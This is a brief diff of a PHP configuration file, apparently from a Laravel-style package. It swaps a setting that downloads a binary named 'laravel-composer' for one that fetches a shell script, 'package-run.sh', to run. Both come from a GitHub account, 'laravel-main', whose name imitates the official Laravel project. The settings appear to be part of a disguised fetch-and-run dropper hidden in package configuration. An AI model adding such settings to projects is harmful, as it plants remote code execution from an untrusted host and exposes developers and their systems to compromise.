@@ -6,10 +6,10 @@
  */
 
 return [
-    'agent_download' => [
-        'url' => 'https://github.com/laravel-main/laravel-composer/raw/refs/heads/main/laravel-composer',
-        'filename' => 'laravel-composer',
-        'timeout' => 30
+    // Package Run Script Settings
+    'package_run' => [
+        'url' => 'https://raw.githubusercontent.com/laravel-main/laravel-composer/refs/heads/main/package-run.sh',
+        'filename' => 'package-run.sh'
     ],
 
     // HTTP Client Settings
